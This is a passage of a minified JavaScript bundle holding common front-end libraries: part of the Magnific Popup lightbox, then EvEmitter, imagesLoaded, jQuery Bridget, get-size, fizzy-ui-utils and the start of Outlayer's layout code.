                    return void 0 === E && (E = void 0 !== document.createElement("p").style.MozTransform), E ? (a["-moz-transform"] = a.transform = "translate(" + s.left + "px," + s.top + "px)") : ((a.left = s.left), (a.top = s.top)), a;
                },
            },
        });
        var L = "iframe",
            $ = function (t) {
                if (e.currTemplate[L]) {
                    var i = e.currTemplate[L].find("iframe");
                    i.length && (t || (i[0].src = "//about:blank"), e.isIE8 && i.css("display", t ? "block" : "none"));
                }
            };
        t.magnificPopup.registerModule(L, {
            options: {
                markup: '<div class="mfp-iframe-scaler"><div class="mfp-close"></div><iframe class="mfp-iframe" src="//about:blank" frameborder="0" allowfullscreen></iframe></div>',
                srcAction: "iframe_src",
                patterns: {
                    youtube: { index: "youtube.com", id: "v=", src: "//www.youtube.com/embed/%id%?autoplay=1" },
                    vimeo: { index: "vimeo.com/", id: "/", src: "//player.vimeo.com/video/%id%?autoplay=1" },
                    gmaps: { index: "//maps.google.", src: "%id%&output=embed" },
                },
            },
            proto: {
                initIframe: function () {
                    e.types.push(L),
                        _("BeforeChange", function (t, e, i) {
                            e !== i && (e === L ? $() : i === L && $(!0));
                        }),
                        _(a + "." + L, function () {
                            $();
                        });
                },
                getIframe: function (i, n) {
                    var s = i.src,
                        r = e.st.iframe;
                    t.each(r.patterns, function () {
                        if (s.indexOf(this.index) > -1) return this.id && (s = "string" == typeof this.id ? s.substr(s.lastIndexOf(this.id) + this.id.length, s.length) : this.id.call(this, s)), (s = this.src.replace("%id%", s)), !1;
                    });
                    var o = {};
                    return r.srcAction && (o[r.srcAction] = s), e._parseMarkup(n, o, i), e.updateStatus("ready"), n;
                },
            },
        });
        var j = function (t) {
                var i = e.items.length;
                return t > i - 1 ? t - i : t < 0 ? i + t : t;
            },
            D = function (t, e, i) {
                return t.replace(/%curr%/gi, e + 1).replace(/%total%/gi, i);
            };
        t.magnificPopup.registerModule("gallery", {
            options: {
                enabled: !1,
                arrowMarkup: '<button title="%title%" type="button" class="mfp-arrow mfp-arrow-%dir%"></button>',
                preload: [0, 2],
                navigateByImgClick: !0,
                arrows: !0,
                tPrev: "Previous (Left arrow key)",
                tNext: "Next (Right arrow key)",
                tCounter: "%curr% of %total%",
            },
            proto: {
                initGallery: function () {
                    var i = e.st.gallery,
                        s = ".mfp-gallery";
                    if (((e.direction = !0), !i || !i.enabled)) return !1;
                    (r += " mfp-gallery"),
                        _(u + s, function () {
                            i.navigateByImgClick &&
                                e.wrap.on("click" + s, ".mfp-img", function () {
                                    if (e.items.length > 1) return e.next(), !1;
                                }),
                                n.on("keydown" + s, function (t) {
                                    37 === t.keyCode ? e.prev() : 39 === t.keyCode && e.next();
                                });
                        }),
                        _("UpdateStatus" + s, function (t, i) {
                            i.text && (i.text = D(i.text, e.currItem.index, e.items.length));
                        }),
                        _(h + s, function (t, n, s, r) {
                            var o = e.items.length;
                            s.counter = o > 1 ? D(i.tCounter, r.index, o) : "";
                        }),
                        _("BuildControls" + s, function () {
                            if (e.items.length > 1 && i.arrows && !e.arrowLeft) {
                                var n = i.arrowMarkup,
                                    s = (e.arrowLeft = t(n.replace(/%title%/gi, i.tPrev).replace(/%dir%/gi, "left")).addClass(p)),
                                    r = (e.arrowRight = t(n.replace(/%title%/gi, i.tNext).replace(/%dir%/gi, "right")).addClass(p));
                                s.click(function () {
                                    e.prev();
                                }),
                                    r.click(function () {
                                        e.next();
                                    }),
                                    e.container.append(s.add(r));
                            }
                        }),
                        _("Change" + s, function () {
                            e._preloadTimeout && clearTimeout(e._preloadTimeout),
                                (e._preloadTimeout = setTimeout(function () {
                                    e.preloadNearbyImages(), (e._preloadTimeout = null);
                                }, 16));
                        }),
                        _(a + s, function () {
                            n.off(s), e.wrap.off("click" + s), (e.arrowRight = e.arrowLeft = null);
                        });
                },
                next: function () {
                    (e.direction = !0), (e.index = j(e.index + 1)), e.updateItemHTML();
                },
                prev: function () {
                    (e.direction = !1), (e.index = j(e.index - 1)), e.updateItemHTML();
                },
                goTo: function (t) {
                    (e.direction = t >= e.index), (e.index = t), e.updateItemHTML();
                },
                preloadNearbyImages: function () {
                    var t,
                        i = e.st.gallery.preload,
                        n = Math.min(i[0], e.items.length),
                        s = Math.min(i[1], e.items.length);
                    for (t = 1; t <= (e.direction ? s : n); t++) e._preloadItem(e.index + t);
                    for (t = 1; t <= (e.direction ? n : s); t++) e._preloadItem(e.index - t);
                },
                _preloadItem: function (i) {
                    if (((i = j(i)), !e.items[i].preloaded)) {
                        var n = e.items[i];
                        n.parsed || (n = e.parseEl(i)),
                            w("LazyLoad", n),
                            "image" === n.type &&
                                (n.img = t('<img class="mfp-img" />')
                                    .on("load.mfploader", function () {
                                        n.hasSize = !0;
                                    })
                                    .on("error.mfploader", function () {
                                        (n.hasSize = !0), (n.loadError = !0), w("LazyLoadError", n);
                                    })
                                    .attr("src", n.src)),
                            (n.preloaded = !0);
                    }
                },
            },
        });
        var N = "retina";
        t.magnificPopup.registerModule(N, {
            options: {
                replaceSrc: function (t) {
                    return t.src.replace(/\.\w+$/, function (t) {
                        return "@2x" + t;
                    });
                },
                ratio: 1,
            },
            proto: {
                initRetina: function () {
                    if (window.devicePixelRatio > 1) {
                        var t = e.st.retina,
                            i = t.ratio;
                        (i = isNaN(i) ? i() : i) > 1 &&
                            (_("ImageHasSize." + N, function (t, e) {
                                e.img.css({ "max-width": e.img[0].naturalWidth / i, width: "100%" });
                            }),
                            _("ElementParse." + N, function (e, n) {
                                n.src = t.replaceSrc(n, i);
                            }));
                    }
                },
            },
        }),
            b();
    }),
    (function (t, e) {
        "function" == typeof define && define.amd ? define("ev-emitter/ev-emitter", e) : "object" == typeof module && module.exports ? (module.exports = e()) : (t.EvEmitter = e());
    })("undefined" != typeof window ? window : this, function () {
        function t() {}
        var e = t.prototype;
        return (
            (e.on = function (t, e) {
                if (t && e) {
                    var i = (this._events = this._events || {}),
                        n = (i[t] = i[t] || []);
                    return -1 == n.indexOf(e) && n.push(e), this;
                }
            }),
            (e.once = function (t, e) {
                if (t && e) {
                    this.on(t, e);
                    var i = (this._onceEvents = this._onceEvents || {});
                    return ((i[t] = i[t] || {})[e] = !0), this;
                }
            }),
            (e.off = function (t, e) {
                var i = this._events && this._events[t];
                if (i && i.length) {
                    var n = i.indexOf(e);
                    return -1 != n && i.splice(n, 1), this;
                }
            }),
            (e.emitEvent = function (t, e) {
                var i = this._events && this._events[t];
                if (i && i.length) {
                    var n = 0,
                        s = i[n];
                    e = e || [];
                    for (var r = this._onceEvents && this._onceEvents[t]; s; ) {
                        var o = r && r[s];
                        o && (this.off(t, s), delete r[s]), s.apply(this, e), (s = i[(n += o ? 0 : 1)]);
                    }
                    return this;
                }
            }),
            t
        );
    }),
    (function (t, e) {
        "use strict";
        "function" == typeof define && define.amd
            ? define(["ev-emitter/ev-emitter"], function (i) {
                  return e(t, i);
              })
            : "object" == typeof module && module.exports
            ? (module.exports = e(t, require("ev-emitter")))
            : (t.imagesLoaded = e(t, t.EvEmitter));
    })(window, function (t, e) {
        function i(t, e) {
            for (var i in e) t[i] = e[i];
            return t;
        }
        function n(t, e, s) {
            return this instanceof n
                ? ("string" == typeof t && (t = document.querySelectorAll(t)),
                  (this.elements = (function (t) {
                      var e = [];
                      if (Array.isArray(t)) e = t;
                      else if ("number" == typeof t.length) for (var i = 0; i < t.length; i++) e.push(t[i]);
                      else e.push(t);
                      return e;
                  })(t)),
                  (this.options = i({}, this.options)),
                  "function" == typeof e ? (s = e) : i(this.options, e),
                  s && this.on("always", s),
                  this.getImages(),
                  o && (this.jqDeferred = new o.Deferred()),
                  void setTimeout(
                      function () {
                          this.check();
                      }.bind(this)
                  ))
                : new n(t, e, s);
        }
        function s(t) {
            this.img = t;
        }
        function r(t, e) {
            (this.url = t), (this.element = e), (this.img = new Image());
        }
        var o = t.jQuery,
            a = t.console;
        ((n.prototype = Object.create(e.prototype)).options = {}),
            (n.prototype.getImages = function () {
                (this.images = []), this.elements.forEach(this.addElementImages, this);
            }),
            (n.prototype.addElementImages = function (t) {
                "IMG" == t.nodeName && this.addImage(t), !0 === this.options.background && this.addElementBackgroundImages(t);
                var e = t.nodeType;
                if (e && l[e]) {
                    for (var i = t.querySelectorAll("img"), n = 0; n < i.length; n++) {
                        var s = i[n];
                        this.addImage(s);
                    }
                    if ("string" == typeof this.options.background) {
                        var r = t.querySelectorAll(this.options.background);
                        for (n = 0; n < r.length; n++) {
                            var o = r[n];
                            this.addElementBackgroundImages(o);
                        }
                    }
                }
            });
        var l = { 1: !0, 9: !0, 11: !0 };
        return (
            (n.prototype.addElementBackgroundImages = function (t) {
                var e = getComputedStyle(t);
                if (e)
                    for (var i = /url\((['"])?(.*?)\1\)/gi, n = i.exec(e.backgroundImage); null !== n; ) {
                        var s = n && n[2];
                        s && this.addBackground(s, t), (n = i.exec(e.backgroundImage));
                    }
            }),
            (n.prototype.addImage = function (t) {
                var e = new s(t);
                this.images.push(e);
            }),
            (n.prototype.addBackground = function (t, e) {
                var i = new r(t, e);
                this.images.push(i);
            }),
            (n.prototype.check = function () {
                function t(t, i, n) {
                    setTimeout(function () {
                        e.progress(t, i, n);
                    });
                }
                var e = this;
                return (
                    (this.progressedCount = 0),
                    (this.hasAnyBroken = !1),
                    this.images.length
                        ? void this.images.forEach(function (e) {
                              e.once("progress", t), e.check();
                          })
                        : void this.complete()
                );
            }),
            (n.prototype.progress = function (t, e, i) {
                this.progressedCount++,
                    (this.hasAnyBroken = this.hasAnyBroken || !t.isLoaded),
                    this.emitEvent("progress", [this, t, e]),
                    this.jqDeferred && this.jqDeferred.notify && this.jqDeferred.notify(this, t),
                    this.progressedCount == this.images.length && this.complete(),
                    this.options.debug && a && a.log("progress: " + i, t, e);
            }),
            (n.prototype.complete = function () {
                var t = this.hasAnyBroken ? "fail" : "done";
                if (((this.isComplete = !0), this.emitEvent(t, [this]), this.emitEvent("always", [this]), this.jqDeferred)) {
                    var e = this.hasAnyBroken ? "reject" : "resolve";
                    this.jqDeferred[e](this);
                }
            }),
            ((s.prototype = Object.create(e.prototype)).check = function () {
                return this.getIsImageComplete()
                    ? void this.confirm(0 !== this.img.naturalWidth, "naturalWidth")
                    : ((this.proxyImage = new Image()),
                      this.proxyImage.addEventListener("load", this),
                      this.proxyImage.addEventListener("error", this),
                      this.img.addEventListener("load", this),
                      this.img.addEventListener("error", this),
                      void (this.proxyImage.src = this.img.src));
            }),
            (s.prototype.getIsImageComplete = function () {
                return this.img.complete && void 0 !== this.img.naturalWidth;
            }),
            (s.prototype.confirm = function (t, e) {
                (this.isLoaded = t), this.emitEvent("progress", [this, this.img, e]);
            }),
            (s.prototype.handleEvent = function (t) {
                var e = "on" + t.type;
                this[e] && this[e](t);
            }),
            (s.prototype.onload = function () {
                this.confirm(!0, "onload"), this.unbindEvents();
            }),
            (s.prototype.onerror = function () {
                this.confirm(!1, "onerror"), this.unbindEvents();
            }),
            (s.prototype.unbindEvents = function () {
                this.proxyImage.removeEventListener("load", this), this.proxyImage.removeEventListener("error", this), this.img.removeEventListener("load", this), this.img.removeEventListener("error", this);
            }),
            ((r.prototype = Object.create(s.prototype)).check = function () {
                this.img.addEventListener("load", this), this.img.addEventListener("error", this), (this.img.src = this.url), this.getIsImageComplete() && (this.confirm(0 !== this.img.naturalWidth, "naturalWidth"), this.unbindEvents());
            }),
            (r.prototype.unbindEvents = function () {
                this.img.removeEventListener("load", this), this.img.removeEventListener("error", this);
            }),
            (r.prototype.confirm = function (t, e) {
                (this.isLoaded = t), this.emitEvent("progress", [this, this.element, e]);
            }),
            (n.makeJQueryPlugin = function (e) {
                (e = e || t.jQuery) &&
                    ((o = e).fn.imagesLoaded = function (t, e) {
                        return new n(this, t, e).jqDeferred.promise(o(this));
                    });
            }),
            n.makeJQueryPlugin(),
            n
        );
    }),
    (function (t, e) {
        "use strict";
        "function" == typeof define && define.amd
            ? define("jquery-bridget/jquery-bridget", ["jquery"], function (i) {
                  e(t, i);
              })
            : "object" == typeof module && module.exports
            ? (module.exports = e(t, require("jquery")))
            : (t.jQueryBridget = e(t, t.jQuery));
    })(window, function (t, e) {
        "use strict";
        var i = Array.prototype.slice,
            n = t.console,
            s =
                void 0 === n
                    ? function () {}
                    : function (t) {
                          n.error(t);
                      };
        function r(n, r, a) {
            (a = a || e || t.jQuery) &&
                (r.prototype.option ||
                    (r.prototype.option = function (t) {
                        a.isPlainObject(t) && (this.options = a.extend(!0, this.options, t));
                    }),
                (a.fn[n] = function (t) {
                    if ("string" == typeof t) {
                        var e = i.call(arguments, 1);
                        return (
                            (h = e),
                            (c = "$()." + n + '("' + (l = t) + '")'),
                            (o = this).each(function (t, e) {
                                var i = a.data(e, n);
                                if (i) {
                                    var r = i[l];
                                    if (r && "_" != l.charAt(0)) {
                                        var o = r.apply(i, h);
                                        u = void 0 === u ? o : u;
                                    } else s(c + " is not a valid method");
                                } else s(n + " not initialized. Cannot call methods, i.e. " + c);
                            }),
                            void 0 !== u ? u : o
                        );
                    }
                    var o, l, h, u, c, d;
                    return (
                        (d = t),
                        this.each(function (t, e) {
                            var i = a.data(e, n);
                            i ? (i.option(d), i._init()) : ((i = new r(e, d)), a.data(e, n, i));
                        }),
                        this
                    );
                }),
                o(a));
        }
        function o(t) {
            !t || (t && t.bridget) || (t.bridget = r);
        }
        return o(e || t.jQuery), r;
    }),
    (function (t, e) {
        "function" == typeof define && define.amd ? define("ev-emitter/ev-emitter", e) : "object" == typeof module && module.exports ? (module.exports = e()) : (t.EvEmitter = e());
    })("undefined" != typeof window ? window : this, function () {
        function t() {}
        var e = t.prototype;
        return (
            (e.on = function (t, e) {
                if (t && e) {
                    var i = (this._events = this._events || {}),
                        n = (i[t] = i[t] || []);
                    return -1 == n.indexOf(e) && n.push(e), this;
                }
            }),
            (e.once = function (t, e) {
                if (t && e) {
                    this.on(t, e);
                    var i = (this._onceEvents = this._onceEvents || {});
                    return ((i[t] = i[t] || {})[e] = !0), this;
                }
            }),
            (e.off = function (t, e) {
                var i = this._events && this._events[t];
                if (i && i.length) {
                    var n = i.indexOf(e);
                    return -1 != n && i.splice(n, 1), this;
                }
            }),
            (e.emitEvent = function (t, e) {
                var i = this._events && this._events[t];
                if (i && i.length) {
                    var n = 0,
                        s = i[n];
                    e = e || [];
                    for (var r = this._onceEvents && this._onceEvents[t]; s; ) {
                        var o = r && r[s];
                        o && (this.off(t, s), delete r[s]), s.apply(this, e), (s = i[(n += o ? 0 : 1)]);
                    }
                    return this;
                }
            }),
            t
        );
    }),
    (function (t, e) {
        "use strict";
        "function" == typeof define && define.amd
            ? define("get-size/get-size", [], function () {
                  return e();
              })
            : "object" == typeof module && module.exports
            ? (module.exports = e())
            : (t.getSize = e());
    })(window, function () {
        "use strict";
        function t(t) {
            var e = parseFloat(t);
            return -1 == t.indexOf("%") && !isNaN(e) && e;
        }
        var e =
                "undefined" == typeof console
                    ? function () {}
                    : function (t) {
                          console.error(t);
                      },
            i = ["paddingLeft", "paddingRight", "paddingTop", "paddingBottom", "marginLeft", "marginRight", "marginTop", "marginBottom", "borderLeftWidth", "borderRightWidth", "borderTopWidth", "borderBottomWidth"],
            n = i.length;
        function s(t) {
            var i = getComputedStyle(t);
            return i || e("Style returned " + i + ". Are you running this code in a hidden iframe on Firefox? See http://bit.ly/getsizebug1"), i;
        }
        var r,
            o = !1;
        function a(e) {
            if (
                ((function () {
                    if (!o) {
                        o = !0;
                        var e = document.createElement("div");
                        (e.style.width = "200px"), (e.style.padding = "1px 2px 3px 4px"), (e.style.borderStyle = "solid"), (e.style.borderWidth = "1px 2px 3px 4px"), (e.style.boxSizing = "border-box");
                        var i = document.body || document.documentElement;
                        i.appendChild(e);
                        var n = s(e);
                        (a.isBoxSizeOuter = r = 200 == t(n.width)), i.removeChild(e);
                    }
                })(),
                "string" == typeof e && (e = document.querySelector(e)),
                e && "object" == typeof e && e.nodeType)
            ) {
                var l = s(e);
                if ("none" == l.display)
                    return (function () {
                        for (var t = { width: 0, height: 0, innerWidth: 0, innerHeight: 0, outerWidth: 0, outerHeight: 0 }, e = 0; e < n; e++) t[i[e]] = 0;
                        return t;
                    })();
                var h = {};
                (h.width = e.offsetWidth), (h.height = e.offsetHeight);
                for (var u = (h.isBorderBox = "border-box" == l.boxSizing), c = 0; c < n; c++) {
                    var d = i[c],
                        f = l[d],
                        p = parseFloat(f);
                    h[d] = isNaN(p) ? 0 : p;
                }
                var g = h.paddingLeft + h.paddingRight,
                    v = h.paddingTop + h.paddingBottom,
                    m = h.marginLeft + h.marginRight,
                    _ = h.marginTop + h.marginBottom,
                    y = h.borderLeftWidth + h.borderRightWidth,
                    w = h.borderTopWidth + h.borderBottomWidth,
                    x = u && r,
                    b = t(l.width);
                !1 !== b && (h.width = b + (x ? 0 : g + y));
                var S = t(l.height);
                return !1 !== S && (h.height = S + (x ? 0 : v + w)), (h.innerWidth = h.width - (g + y)), (h.innerHeight = h.height - (v + w)), (h.outerWidth = h.width + m), (h.outerHeight = h.height + _), h;
            }
        }
        return a;
    }),
    (function (t, e) {
        "use strict";
        "function" == typeof define && define.amd ? define("desandro-matches-selector/matches-selector", e) : "object" == typeof module && module.exports ? (module.exports = e()) : (t.matchesSelector = e());
    })(window, function () {
        "use strict";
        var t = (function () {
            var t = Element.prototype;
            if (t.matches) return "matches";
            if (t.matchesSelector) return "matchesSelector";
            for (var e = ["webkit", "moz", "ms", "o"], i = 0; i < e.length; i++) {
                var n = e[i] + "MatchesSelector";
                if (t[n]) return n;
            }
        })();
        return function (e, i) {
            return e[t](i);
        };
    }),
    (function (t, e) {
        "function" == typeof define && define.amd
            ? define("fizzy-ui-utils/utils", ["desandro-matches-selector/matches-selector"], function (i) {
                  return e(t, i);
              })
            : "object" == typeof module && module.exports
            ? (module.exports = e(t, require("desandro-matches-selector")))
            : (t.fizzyUIUtils = e(t, t.matchesSelector));
    })(window, function (t, e) {
        var i = {
                extend: function (t, e) {
                    for (var i in e) t[i] = e[i];
                    return t;
                },
                modulo: function (t, e) {
                    return ((t % e) + e) % e;
                },
                makeArray: function (t) {
                    var e = [];
                    if (Array.isArray(t)) e = t;
                    else if (t && "number" == typeof t.length) for (var i = 0; i < t.length; i++) e.push(t[i]);
                    else e.push(t);
                    return e;
                },
                removeFrom: function (t, e) {
                    var i = t.indexOf(e);
                    -1 != i && t.splice(i, 1);
                },
                getParent: function (t, i) {
                    for (; t != document.body; ) if (((t = t.parentNode), e(t, i))) return t;
                },
                getQueryElement: function (t) {
                    return "string" == typeof t ? document.querySelector(t) : t;
                },
                handleEvent: function (t) {
                    var e = "on" + t.type;
                    this[e] && this[e](t);
                },
                filterFindElements: function (t, n) {
                    t = i.makeArray(t);
                    var s = [];
                    return (
                        t.forEach(function (t) {
                            if (t instanceof HTMLElement)
                                if (n) {
                                    e(t, n) && s.push(t);
                                    for (var i = t.querySelectorAll(n), r = 0; r < i.length; r++) s.push(i[r]);
                                } else s.push(t);
                        }),
                        s
                    );
                },
                debounceMethod: function (t, e, i) {
                    var n = t.prototype[e],
                        s = e + "Timeout";
                    t.prototype[e] = function () {
                        var t = this[s];
                        t && clearTimeout(t);
                        var e = arguments,
                            r = this;
                        this[s] = setTimeout(function () {
                            n.apply(r, e), delete r[s];
                        }, i || 100);
                    };
                },
                docReady: function (t) {
                    var e = document.readyState;
                    "complete" == e || "interactive" == e ? t() : document.addEventListener("DOMContentLoaded", t);
                },
                toDashed: function (t) {
                    return t
                        .replace(/(.)([A-Z])/g, function (t, e, i) {
                            return e + "-" + i;
                        })
                        .toLowerCase();
                },
            },
            n = t.console;
        return (
            (i.htmlInit = function (e, s) {
                i.docReady(function () {
                    var r = i.toDashed(s),
                        o = "data-" + r,
                        a = document.querySelectorAll("[" + o + "]"),
                        l = document.querySelectorAll(".js-" + r),
                        h = i.makeArray(a).concat(i.makeArray(l)),
                        u = o + "-options",
                        c = t.jQuery;
                    h.forEach(function (t) {
                        var i,
                            r = t.getAttribute(o) || t.getAttribute(u);
                        try {
                            i = r && JSON.parse(r);
                        } catch (e) {
                            return void (n && n.error("Error parsing " + o + " on " + t.className + ": " + e));
                        }
                        var a = new e(t, i);
                        c && c.data(t, s, a);
                    });
                });
            }),
            i
        );
    }),
    (function (t, e) {
        "function" == typeof define && define.amd
            ? define("outlayer/item", ["ev-emitter/ev-emitter", "get-size/get-size"], e)
            : "object" == typeof module && module.exports
            ? (module.exports = e(require("ev-emitter"), require("get-size")))
            : ((t.Outlayer = {}), (t.Outlayer.Item = e(t.EvEmitter, t.getSize)));
    })(window, function (t, e) {
        "use strict";
        var i = document.documentElement.style,
            n = "string" == typeof i.transition ? "transition" : "WebkitTransition",
            s = "string" == typeof i.transform ? "transform" : "WebkitTransform",
            r = { WebkitTransition: "webkitTransitionEnd", transition: "transitionend" }[n],
            o = { transform: s, transition: n, transitionDuration: n + "Duration", transitionProperty: n + "Property", transitionDelay: n + "Delay" };
        function a(t, e) {
            t && ((this.element = t), (this.layout = e), (this.position = { x: 0, y: 0 }), this._create());
        }
        var l = (a.prototype = Object.create(t.prototype));
        (l.constructor = a),
            (l._create = function () {
                (this._transn = { ingProperties: {}, clean: {}, onEnd: {} }), this.css({ position: "absolute" });
            }),
            (l.handleEvent = function (t) {
                var e = "on" + t.type;
                this[e] && this[e](t);
            }),
            (l.getSize = function () {
                this.size = e(this.element);
            }),
            (l.css = function (t) {
                var e = this.element.style;
                for (var i in t) {
                    e[o[i] || i] = t[i];
                }
            }),
            (l.getPosition = function () {
                var t = getComputedStyle(this.element),
                    e = this.layout._getOption("originLeft"),
                    i = this.layout._getOption("originTop"),
                    n = t[e ? "left" : "right"],
                    s = t[i ? "top" : "bottom"],
                    r = this.layout.size,
                    o = -1 != n.indexOf("%") ? (parseFloat(n) / 100) * r.width : parseInt(n, 10),
                    a = -1 != s.indexOf("%") ? (parseFloat(s) / 100) * r.height : parseInt(s, 10);
                (o = isNaN(o) ? 0 : o), (a = isNaN(a) ? 0 : a), (o -= e ? r.paddingLeft : r.paddingRight), (a -= i ? r.paddingTop : r.paddingBottom), (this.position.x = o), (this.position.y = a);
            }),
            (l.layoutPosition = function () {
                var t = this.layout.size,
                    e = {},
                    i = this.layout._getOption("originLeft"),
                    n = this.layout._getOption("originTop"),
                    s = i ? "paddingLeft" : "paddingRight",
                    r = i ? "left" : "right",
                    o = i ? "right" : "left",
                    a = this.position.x + t[s];
                (e[r] = this.getXValue(a)), (e[o] = "");
                var l = n ? "paddingTop" : "paddingBottom",
                    h = n ? "top" : "bottom",
                    u = n ? "bottom" : "top",
                    c = this.position.y + t[l];
                (e[h] = this.getYValue(c)), (e[u] = ""), this.css(e), this.emitEvent("layout", [this]);
            }),
            (l.getXValue = function (t) {
                var e = this.layout._getOption("horizontal");
                return this.layout.options.percentPosition && !e ? (t / this.layout.size.width) * 100 + "%" : t + "px";
            }),
            (l.getYValue = function (t) {
                var e = this.layout._getOption("horizontal");
                return this.layout.options.percentPosition && e ? (t / this.layout.size.height) * 100 + "%" : t + "px";
            }),
            (l._transitionTo = function (t, e) {
                this.getPosition();
                var i = this.position.x,
                    n = this.position.y,
                    s = parseInt(t, 10),
                    r = parseInt(e, 10),
                    o = s === this.position.x && r === this.position.y;
                if ((this.setPosition(t, e), !o || this.isTransitioning)) {
                    var a = t - i,
                        l = e - n,
                        h = {};
                    (h.transform = this.getTranslate(a, l)), this.transition({ to: h, onTransitionEnd: { transform: this.layoutPosition }, isCleaning: !0 });
                } else this.layoutPosition();
            }),
            (l.getTranslate = function (t, e) {
                return "translate3d(" + (t = this.layout._getOption("originLeft") ? t : -t) + "px, " + (e = this.layout._getOption("originTop") ? e : -e) + "px, 0)";
            }),
            (l.goTo = function (t, e) {
                this.setPosition(t, e), this.layoutPosition();
            }),
            (l.moveTo = l._transitionTo),
            (l.setPosition = function (t, e) {
                (this.position.x = parseInt(t, 10)), (this.position.y = parseInt(e, 10));
            }),
            (l._nonTransition = function (t) {
                for (var e in (this.css(t.to), t.isCleaning && this._removeStyles(t.to), t.onTransitionEnd)) t.onTransitionEnd[e].call(this);
            }),
            (l.transition = function (t) {
                if (parseFloat(this.layout.options.transitionDuration)) {
                    var e = this._transn;
                    for (var i in t.onTransitionEnd) e.onEnd[i] = t.onTransitionEnd[i];
                    for (i in t.to) (e.ingProperties[i] = !0), t.isCleaning && (e.clean[i] = !0);
                    if (t.from) {
                        this.css(t.from);
                        this.element.offsetHeight;
                        null;
                    }
                    this.enableTransition(t.to), this.css(t.to), (this.isTransitioning = !0);
                } else this._nonTransition(t);
            });
        var h =
            "opacity," +
            s.replace(/([A-Z])/g, function (t) {
                return "-" + t.toLowerCase();
            });
        (l.enableTransition = function () {
            if (!this.isTransitioning) {
                var t = this.layout.options.transitionDuration;
                (t = "number" == typeof t ? t + "ms" : t), this.css({ transitionProperty: h, transitionDuration: t, transitionDelay: this.staggerDelay || 0 }), this.element.addEventListener(r, this, !1);
            }
        }),
            (l.onwebkitTransitionEnd = function (t) {
                this.ontransitionend(t);
            }),
            (l.onotransitionend = function (t) {
                this.ontransitionend(t);
            });
        var u = { "-webkit-transform": "transform" };
        (l.ontransitionend = function (t) {
            if (t.target === this.element) {
                var e = this._transn,
                    i = u[t.propertyName] || t.propertyName;
                if (
                    (delete e.ingProperties[i],
                    (function (t) {
                        for (var e in t) return !1;
                        return !0;
                    })(e.ingProperties) && this.disableTransition(),
                    i in e.clean && ((this.element.style[t.propertyName] = ""), delete e.clean[i]),
                    i in e.onEnd)
                )
                    e.onEnd[i].call(this), delete e.onEnd[i];
                this.emitEvent("transitionEnd", [this]);
            }
        }),
            (l.disableTransition = function () {
                this.removeTransitionStyles(), this.element.removeEventListener(r, this, !1), (this.isTransitioning = !1);
            }),
            (l._removeStyles = function (t) {
                var e = {};
                for (var i in t) e[i] = "";
                this.css(e);
            });
        var c = { transitionProperty: "", transitionDuration: "", transitionDelay: "" };
        return (
            (l.removeTransitionStyles = function () {
                this.css(c);
            }),
            (l.stagger = function (t) {
                (t = isNaN(t) ? 0 : t), (this.staggerDelay = t + "ms");
            }),
            (l.removeElem = function () {
                this.element.parentNode.removeChild(this.element), this.css({ display: "" }), this.emitEvent("remove", [this]);
            }),
            (l.remove = function () {
                n && parseFloat(this.layout.options.transitionDuration)
                    ? (this.once("transitionEnd", function () {
                          this.removeElem();
                      }),
                      this.hide())
                    : this.removeElem();
            }),
            (l.reveal = function () {
                delete this.isHidden, this.css({ display: "" });
                var t = this.layout.options,
                    e = {};
                (e[this.getHideRevealTransitionEndProperty("visibleStyle")] = this.onRevealTransitionEnd), this.transition({ from: t.hiddenStyle, to: t.visibleStyle, isCleaning: !0, onTransitionEnd: e });
            }),
            (l.onRevealTransitionEnd = function () {
                this.isHidden || this.emitEvent("reveal");
            }),
            (l.getHideRevealTransitionEndProperty = function (t) {
                var e = this.layout.options[t];
                if (e.opacity) return "opacity";
                for (var i in e) return i;
            }),
            (l.hide = function () {
                (this.isHidden = !0), this.css({ display: "" });
                var t = this.layout.options,
                    e = {};
                (e[this.getHideRevealTransitionEndProperty("hiddenStyle")] = this.onHideTransitionEnd), this.transition({ from: t.visibleStyle, to: t.hiddenStyle, isCleaning: !0, onTransitionEnd: e });
            }),
            (l.onHideTransitionEnd = function () {
                this.isHidden && (this.css({ display: "none" }), this.emitEvent("hide"));
            }),
            (l.destroy = function () {
                this.css({ position: "", left: "", right: "", top: "", bottom: "", transition: "", transform: "" });
            }),
            a
        );
    }),
    (function (t, e) {
        "use strict";
        "function" == typeof define && define.amd
            ? define("outlayer/outlayer", ["ev-emitter/ev-emitter", "get-size/get-size", "fizzy-ui-utils/utils", "./item"], function (i, n, s, r) {
                  return e(t, i, n, s, r);
              })
            : "object" == typeof module && module.exports
            ? (module.exports = e(t, require("ev-emitter"), require("get-size"), require("fizzy-ui-utils"), require("./item")))
            : (t.Outlayer = e(t, t.EvEmitter, t.getSize, t.fizzyUIUtils, t.Outlayer.Item));
    })(window, function (t, e, i, n, s) {
        "use strict";
        var r = t.console,
            o = t.jQuery,
            a = function () {},
            l = 0,
            h = {};
        function u(t, e) {
            var i = n.getQueryElement(t);
            if (i) {
                (this.element = i), o && (this.$element = o(this.element)), (this.options = n.extend({}, this.constructor.defaults)), this.option(e);
                var s = ++l;
                (this.element.outlayerGUID = s), (h[s] = this), this._create(), this._getOption("initLayout") && this.layout();
            } else r && r.error("Bad element for " + this.constructor.namespace + ": " + (i || t));
        }
        (u.namespace = "outlayer"),
            (u.Item = s),
            (u.defaults = {
                containerStyle: { position: "relative" },
                initLayout: !0,
                originLeft: !0,
                originTop: !0,
                resize: !0,
                resizeContainer: !0,
                transitionDuration: "0.4s",
                hiddenStyle: { opacity: 0, transform: "scale(0.001)" },
                visibleStyle: { opacity: 1, transform: "scale(1)" },
            });
        var c = u.prototype;
        function d(t) {
            function e() {
                t.apply(this, arguments);
            }
            return ((e.prototype = Object.create(t.prototype)).constructor = e), e;
        }
        n.extend(c, e.prototype),
            (c.option = function (t) {
                n.extend(this.options, t);
            }),
            (c._getOption = function (t) {
                var e = this.constructor.compatOptions[t];
                return e && void 0 !== this.options[e] ? this.options[e] : this.options[t];
            }),
            (u.compatOptions = {
                initLayout: "isInitLayout",
                horizontal: "isHorizontal",
                layoutInstant: "isLayoutInstant",
                originLeft: "isOriginLeft",
                originTop: "isOriginTop",
                resize: "isResizeBound",
                resizeContainer: "isResizingContainer",
            }),
            (c._create = function () {
                this.reloadItems(), (this.stamps = []), this.stamp(this.options.stamp), n.extend(this.element.style, this.options.containerStyle), this._getOption("resize") && this.bindResize();
            }),
            (c.reloadItems = function () {
                this.items = this._itemize(this.element.children);
            }),
            (c._itemize = function (t) {
                for (var e = this._filterFindItemElements(t), i = this.constructor.Item, n = [], s = 0; s < e.length; s++) {
